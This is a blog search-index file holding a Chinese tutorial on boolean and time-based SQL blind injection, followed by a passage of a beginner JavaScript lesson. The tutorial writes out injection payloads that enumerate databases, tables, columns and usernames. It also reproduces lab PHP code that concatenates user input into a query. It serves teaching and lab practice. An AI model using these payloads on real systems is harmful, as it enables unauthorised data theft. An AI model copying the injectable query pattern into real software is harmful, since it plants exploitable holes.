<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/12/03/SQL%E7%9B%B2%E6%B3%A8/"/>
    <url>/2022/12/03/SQL%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><h2 id="什么是SQL盲注"><a href="#什么是SQL盲注" class="headerlink" title="什么是SQL盲注"></a>什么是SQL盲注</h2><p>盲注是SQL注入的其中一种，是在SQL注入的基础上，根据根据SQL注入的回显不同来进行判断的</p><p>什么叫回显的不同，举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT * FROM users WHERE id=<span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行这个语句进行查询，如果你能看到查询到的数据，就叫做有回显，如果你没看到查询的具体信息，只告诉你查询成功等信息，甚至什么都不说，但是在这个过程中，SQL语句被执行了，SQL注入也发生了，只是我们拿不到注入的结果</p><p>那么遇到查不到详细信息的情况怎么办呢，就需要用到SQL盲注的知识，可以理解为一种爆破</p><p>比如他只告诉你查询成功和查询失败，那么你就可以这样去问</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs erlang">如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是a，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是b，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">1</span>个字母是c，你就说“查询成功”，否则就说“查询失败”<br>...<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是a，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是b，你就说“查询成功”，否则就说“查询失败”<br>如果<span class="hljs-string">&quot;数据库名&quot;</span>的第<span class="hljs-number">2</span>个字母是c，你就说“查询成功”，否则就说“查询失败”<br>...<br></code></pre></td></tr></table></figure><p>这样通过不断的测试，从数据库名开始测试，到数据库表名，再到字段名，再到具体的数据，这样就可以成功进行SQL注入，查询到我们所需要的信息，而SQL查询结构是被<code>WHERE</code>子句所控制的，所以攻击者一般就是对<code>WHERE</code>子句进行构造</p><h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>总的来说，可以分成布尔盲注和时间盲注</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>就是我们上面举例所说的，WEB应用只返回查询成功和查询失败，通过成功和失败进行判断是否查到了我们需要的信息</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>那如果遇到完全无回显的情况怎么办呢，连成功和失败都不告诉你，就需要用到时间盲注，通过响应的时长进行判断，如果满足xx条件，就sleep指定时间，否则就不sleep，这样只要看服务器是否延时响应即可进行判断</p><h2 id="如何进行盲注"><a href="#如何进行盲注" class="headerlink" title="如何进行盲注"></a>如何进行盲注</h2><h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>一般情况下题目是不会给到具体的源码的，所以需要我们自己去猜测后端执行sql查询的命令是什么</p><p>查询语句的构造一般都是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> xx <span class="hljs-keyword">from</span> xx <span class="hljs-keyword">where</span> xx <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在这个语句中，只有$id是我们可控的，所以我们盲注的第一步，是要找到id这个注入点</p><p>然后，找到了注入点之后，就需要开始构造我们的查询语句了</p><p>我们首先猜测他的语句是这样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span><br></code></pre></td></tr></table></figure><p>之前我们讲过，要查询具体的数据，首先要知道数据库名</p><p>那我们先开始测试数据库名的长度</p><p>根据他给的语句我们可以进行如下构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><p>在测试出数据库名的长度之后，我们就可以继续测试数据库的表名了</p><p>这里就需要用到一个叫做substr的函数了</p><p>这个函数的作用是截取字符串</p><p><strong>substr(strings,m,n)</strong></p><p>strings ：被截取的字符串或字符串表达式</p><p>m 从第m个字符开始截取</p><p>n 截取后字符串长度为n</p><p>简单的说，就是<code>substr(要截取的字符串，从哪一位开始截取，截取多长)</code></p><p>还有几种substr的替代品</p><p>比如<code>mid()</code>，这个函数的用法和substr一样</p><p><code>right()</code>，right(截取的字符串，截取长度)</p><p><code>trim()</code>，TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str)表示移除str这个字符串首尾（BOTH）&#x2F;句首（LEADING）&#x2F;句尾（TRAILING）的remstr</p><p>然后我们再次尝试如下构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span> #<br></code></pre></td></tr></table></figure><p>经过这样爆破，我们也可以知道数据库的库名了，接下来就是去找我们需要查的表名</p><p>我们需要先了解一下<strong>information_schema</strong>，这是一个存储数据库信息的数据库，里面存了Mysql服务器所维护的所有数据库的各类信息</p><p>我们一般只关注两张表：tables 和 columns</p><p>先查security数据库中第一个表名的长度</p><p>所以我们的构造如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">6</span> #<br></code></pre></td></tr></table></figure><p>在查询出了表名长度之后，我们可以继续对表名进行爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;e&#x27;</span> #<br></code></pre></td></tr></table></figure><p>接下来就是字段名的爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;i&#x27;</span>#<br></code></pre></td></tr></table></figure><p>接下来就是针对字段名进行数据的爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;D&#x27;</span> #<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// take the variables</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>    &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    <span class="hljs-comment">//echo &#x27;You are in...........&#x27;;</span><br>    <span class="hljs-comment">//print_r(mysql_error());</span><br>    <span class="hljs-comment">//echo &quot;You have an error in your SQL syntax&quot;;</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>首先还是对数据库名的长度进行猜测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">5</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure><p>再对数据库名进行猜测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s&#x27;</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure><p>对数据库表名长度进行猜测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> length(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">6</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure><p>对数据库表名进行猜测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if((<span class="hljs-keyword">select</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s&#x27;</span> ,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure><p>对数据库字段名进行猜测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> xxx <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> if(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;i&#x27;</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>)#<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// take the variables</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity </span><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>        &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>        <span class="hljs-comment">//print_r(mysql_error());</span><br>        <span class="hljs-comment">//echo &quot;You have an error in your SQL syntax&quot;;</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;<br><br>        &#125;<br>&#125;<br>        <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/11/08/JavaScript%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/08/JavaScript%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaScript学习"><a href="#JavaScript学习" class="headerlink" title="JavaScript学习"></a>JavaScript学习</h1><p>JavaScript是前端的一种脚本，，简单的来说，就是让前端网页由静态编程动态的一种语言，可以用来创建动态更新的内容，它是一种解释型语言，即不提前编译，代码以文本格式传输到浏览器上进行接收，采用了一种叫做即时编译（just-in-time compiling）的技术</p><p>这是构建一个网页的过程：</p><p>浏览器在读取一个网页时，<strong>代码</strong>（HTML, CSS 和 JavaScript）将在一个<strong>运行环境</strong>（浏览器标签页）中得到执行。就像一间工厂，将原材料（代码）加工为一件产品（网页），然后在HTML和CSS组装成一个网页之后，浏览器的 JavaScript 引擎将执行 JavaScript 代码，这样就可以实现根据<strong>DOM（Document Object Model） API</strong>对网页的各种内容进行动态修改</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/First_steps/What_is_JavaScript/execution.png" alt="img"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>使用关键字 <code>let</code> 和一个名字来创建变量，使用关键字 <code>const</code> 和一个名字来创建常量</p><p>可以使用等号（&#x3D;）和一个值来为变量或常量赋值</p><p>函数定义（可以在控制台中输入<code>checkGuess();</code>进行调用，弹出一个告警文本框）</p><p>这里我们使用关键字 <code>function</code> 、一个函数名、一对小括号定义了一个函数。随后是一对花括号<code>&#123;&#125;</code>，花括号内部是调用函数时要运行的所有代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkGuess</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;I am a placeholder&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaScript允许使用 <code>+</code> 运算符将文本字符串进行连接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> name1 = <span class="hljs-string">&#x27;Bingo&#x27;</span>;<br>name1 += <span class="hljs-string">&#x27; says hello!&#x27;</span>;<br></code></pre></td></tr></table></figure><p>JavaScript执行真&#x2F;假比较时，全等使用<code>===</code>，不相等使用<code>!==</code></p><p>简单的一个<strong>猜数字实例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//随机生成一个数字</span><br><span class="hljs-keyword">let</span> randomNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//分别指向 HTML 结果段落中某个元素</span><br><span class="hljs-keyword">const</span> guesses = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.guesses&#x27;</span>);<br><span class="hljs-keyword">const</span> lastResult = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.lastResult&#x27;</span>);<br><span class="hljs-keyword">const</span> lowOrHi = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.lowOrHi&#x27;</span>);<br><br><span class="hljs-comment">//存储对表单文本输入和提交按钮的引用</span><br><span class="hljs-keyword">const</span> guessSubmit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.guessSubmit&#x27;</span>);<br><span class="hljs-keyword">const</span> guessField = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.guessField&#x27;</span>);<br><br><span class="hljs-comment">//存储计数器</span><br><span class="hljs-keyword">let</span> guessCount = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//重置按钮</span><br><span class="hljs-keyword">let</span> resetButton;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkGuess</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">//声明一个变量，让他的值等于guessField（即输入框）中的值</span><br>  <span class="hljs-keyword">const</span> userGuess = <span class="hljs-title class_">Number</span>(guessField.<span class="hljs-property">value</span>);<br>  <span class="hljs-comment">//判断</span><br>  <span class="hljs-keyword">if</span> (guessCount === <span class="hljs-number">1</span>) &#123;<br>    guesses.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Previous guesses: &#x27;</span>;<br>  &#125;<br>  <span class="hljs-comment">//将猜的值和一个空格附加到段落末尾</span><br>  guesses.<span class="hljs-property">textContent</span> += <span class="hljs-string">`<span class="hljs-subst">$&#123;userGuess&#125;</span> `</span>;<br>  <span class="hljs-comment">//判断</span><br>  <span class="hljs-keyword">if</span> (userGuess === randomNumber) &#123;<br>    <span class="hljs-comment">//更改文本框内容</span><br>    